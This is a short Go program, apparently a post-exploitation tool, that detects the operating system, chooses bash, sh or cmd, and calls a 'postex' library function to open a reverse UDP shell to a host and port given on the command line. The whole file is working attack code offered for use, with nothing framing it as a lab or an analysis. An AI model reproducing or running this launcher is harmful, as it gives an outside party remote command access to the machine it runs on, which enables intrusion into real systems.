package main

import "fmt"
import "strconv"
import "runtime"
import "os"
import "postex"

func main() {
	//perform OS detection and check for a valid shell
	filepath := ""
	if runtime.GOOS == "linux" {
		if postex.Exists("/bin/bash") == nil {
			filepath = "/bin/bash"
		} else if postex.Exists("/bin/sh") == nil {
			filepath = "/bin/sh"
		} else {
			fmt.Println("[?] Could not detect a supported Linux shell (bash or sh). Defaulting to '/bin/sh'.")
			return
		}
	} else if runtime.GOOS == "windows" {
		filepath = "cmd"
	} else {
		fmt.Println("[?] Could not detect either Linux or Windows OS. Defaulting to '/bin/sh'.")
		filepath = "/bin/sh"
	}
	//input handling
	if len(os.Args) < 3 {
		fmt.Println("SYNTAX:", os.Args[0], "[target] [port]")
		return
	}
	host := os.Args[1]
	port,err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("SYNTAX:", os.Args[0], "[target] [port]")
		return
	}
	//let's do it!
	fmt.Println("Sending a present to", host + ":" + os.Args[2])
	postex.ReverseUDPShell(filepath, host, port)
}
